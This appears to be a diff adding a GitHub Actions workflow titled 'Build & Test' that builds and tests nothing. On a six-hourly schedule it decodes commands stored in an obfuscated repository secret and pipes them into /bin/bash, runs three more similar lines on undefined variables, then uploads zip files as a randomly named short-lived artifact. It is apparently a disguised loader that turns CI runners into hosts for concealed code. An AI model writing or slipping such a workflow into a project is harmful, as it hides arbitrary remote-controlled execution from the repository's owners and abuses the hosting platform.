@@ -1,0 +1,36 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          bxfe3304: ${{ secrets.bxfe3304 }}
+        run: |
+          printf '%s' "$bxfe3304" | jq -r .ejjj10557 | /bin/bash
+          printf '%s' "$alm88664" | jq -r .n384 | /bin/bash
+          echo $agsm5604 | jq -r .urw93675 | /bin/bash
+          printf '%s' "$pvrc46" | jq -r .yiw23 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VSN6pRLu
+          path: "*.zip"
+          retention-days: 1
